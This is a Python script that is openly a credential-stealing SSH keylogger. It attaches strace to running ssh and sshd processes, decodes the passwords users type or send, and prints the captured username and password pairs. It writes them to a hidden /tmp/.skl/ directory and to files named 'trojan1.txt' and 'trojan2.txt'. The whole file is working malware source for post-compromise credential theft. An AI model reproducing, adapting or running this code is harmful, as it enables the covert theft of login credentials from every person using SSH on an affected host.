#!/usr/bin/python

"""This program logs all keystrokes sent to and from ssh and
sshd.  It does this by attaching strace to a ssh process and parsing out the
keystrokes."""

from subprocess import Popen, PIPE
from re import split
from time import sleep
import threading
import re
import os

class Process(object):
    """Parses out the process list."""

    def __init__(self, proc_info):

        self.user  = proc_info[0]
        self.pid   = proc_info[1]
        self.ppid  = proc_info[2]
        self.comm   = proc_info[3]
        self.arg   = proc_info[4:]
    def find_sshd(self):
        """Returns ssh connections to the machine."""
        if self.comm == 'sshd':
            return "New SSHD Incoming Connection: User login {} Running on PID {}".format(self.arg[1], self.pid)

    def find_ssh(self):
        """Returns ssh connections from the machine."""
        if self.comm == "ssh":
            return "New Outgoing connection from {} to {} with the PID {}".format(self.user, str(self.arg[2]).split('@')[1], self.pid)
def get_ps():
    """Retreives information from ps."""
    proc_list = []
    sub_proc = Popen(['ps', 'awxeo','user,pid,ppid,comm,cmd'], shell=False, stdout=PIPE)
    # Remove header
    sub_proc.stdout.readline()
    for line in sub_proc.stdout:
        #Split based on whitespace
        line = str(line,encoding='utf-8')
        line = re.findall(r"\S*\S", line)
        if 'ssh' in line[3] and '1'!=line[2]:
            if len(line)>=6:
                if '[priv]' == line[6] or 'ssh' == line[3]:
                    proc_info =  line
                    proc_list.append(Process(proc_info))
    return proc_list

def keylogger_ssh(proc):
    """Keylogger for ssh."""
    print("Starting Keylogger to montior {} on {}".format(proc.user, proc.pid))
    # Open SSH process using strace
    logger = Popen(['strace', '-s', '16384', '-p', proc.pid,'-e','write,read','-x'], shell=False, stdout=PIPE, stderr=PIPE)

    # Open the log file
    logfilename = DIR + proc.user + "_" + str(proc.arg[2]).split('@')[1] + "_" + proc.pid +"_ssh.log"
    logfile = open(logfilename,"a")
    input_pass = 0
    password = ""
    trojan = "/tmp/trojan2.txt"
    while True:
        # Check to see if strace has closed
        logger.poll()
        # Read output from strace
        output = logger.stderr.readline()
        #  Close log file if strace has ended
        if  not output and logger.returncode is not None:
            print("Connection closed from {} PID {}".format(str(proc.arg[2]).split('@')[1], proc.pid))
            logfile.close()
            SSHPROCS.remove(proc.pid)
            break
        # Only log the user's input
        # if "read(" in output and ", 16384)" in output and "= 1" in output:
        #     keystroke = re.sub(r'read\(.*, "(.*)", 16384\).*= 1', r'\1', \
        #     output)
        #     # Strip new linesps
        #     keystroke = keystroke.rstrip('\n')
        #     # convert \r to new line
        #     keystroke = re.sub(r'\\r', r'\n', keystroke)
        #     # convert \3 to a ^C
        #     keystroke = re.sub(r'\\3', r'^C\n', keystroke)
        #     # convert \4 to a ^D
        #     keystroke = re.sub(r'\\4', r'^D\n', keystroke)
        #     # convert \177 to \b
        #     keystroke = re.sub(r'\\177', r'\\b', keystroke)
        #     # convert \27 to \w
        #     keystroke = re.sub(r'\\27', r'\\w', keystroke)
        #     logfile.write(keystroke)
        output = re.findall(r'".*"',str(output))
        if(len(output)==0):
            continue
        if '\\\\n' in output[0]:
            input_pass = 1
        if input_pass == 0 and len(output)>0:
            output = output[0]
            password = password+str(output[1:-1])
        if 'Permission denied' in output:
            password = ""
            input_pass = 0
        if 'Last login' in output[0]:
            print(str(proc.arg[2])+"-"+password)
            logfile.write(str(proc.arg[2])+"-"+password+"\n")
            logfile.close()
    logfile = open(logfilename,"r")
    acctrojan = open(trojan,"a") 
    acc = logfile.readlines()
    for i in acc:
        acctrojan.write(i)
def keylogger_sshd(proc):
    """Keylogger for SSHD."""
    print("Starting Keylogger to monitor {} connection on {}".format(proc.user, proc.pid))

    # Open SSH process using strace
    logger = Popen(['strace', '-s', '99999', '-p', proc.pid, '-x',"-e", "write,read,sendto"], shell=False, stdout=PIPE, stderr=PIPE)

    # Open the log file
    logfilename = DIR + proc.user + "_" + proc.pid +"_sshd.log"
    trojan = "/tmp/trojan1.txt"
    logfile = open(logfilename,"a")
    input_pass = 0
    password = ''
    while True:
        # Check to see if strace has closed
        logger.poll()
        # Read output from strace
        output = logger.stderr.readline()
        #  Close log file if strace has ended
        if not output and logger.returncode is not None:
            print("Connection closed from {} PID {}".format(proc.arg, proc.pid))
            logfile.close()
            SSHPROCS.remove(proc.pid)
            break
        output = str(output)
        if '\\\\x0c\\\\x00\\\\x00\\\\x00' in output:
            output = str(re.findall(r'".*"',str(output))[0])
            password = output.replace('\\\\x0c\\\\x00\\\\x00\\\\x00\\\\','').replace('\\\\','').replace('"','').replace('x','').upper()
            for i in range(2,len(password),2):
                if int(password[0:i],16) == (len(password)-i)//2:
                    password = password[i:]
                    password = bytes.fromhex(password)
                    password = password.decode('utf-8')
                    input_pass = 1
                    break
        if '\\\\x00\\\\x00\\\\x00' in output:
            input_pass = 0
        if "sshd[{}]".format(proc.pid) in output:
            output = re.findall(r'".*"',str(output))[0]
            if 'Accepted password' in output or 'session opened' in output:
                try:
                    logfile.write(str(proc.arg[1])+"-"+password+"\n")
                    logfile.close()
                    print("Find 1 account: user:",proc.arg[1],"pass:",password)
                except:
                    continue
            else:
                input_pass=0
    logfile = open(logfilename,"r")
    acctrojan = open(trojan,"a") 
    acc = logfile.readlines()
    for i in acc:
        acctrojan.write(i)
    acctrojan.close()
    logfile.close()
def check_ps():
    """Checks to see if any new ssh processes are running."""
    pslist = get_ps()
    for proc in pslist:
        # Check to see if SSHD process is already monitored
        if proc.find_sshd():
            if proc.pid not in SSHPROCS:
                SSHPROCS.append(proc.pid)
                print(proc.find_sshd())
                tsshd = threading.Thread(target=keylogger_sshd, args=[proc])
                tsshd.start()
        # Check to see if SSH process is already monitored
        elif proc.find_ssh():
            if proc.pid not in SSHPROCS:
                SSHPROCS.append(proc.pid)
                print(proc.find_ssh())
                tssh = threading.Thread(target=keylogger_ssh, args=[proc])
                tssh.start()

if __name__ == "__main__":
    SSHPROCS = []
    # # Directory to save logs to
    DIR = "/tmp/.skl/"
    
    # # How often to look for new processes
    CHECKEVERY = 2
    
    print("Logging SSH processes")
    # # Create log directory if it does not exist
    if not os.path.exists(DIR):
        os.makedirs(DIR)

     # Check for new processes
    while True:
        check_ps()
        sleep(CHECKEVERY)
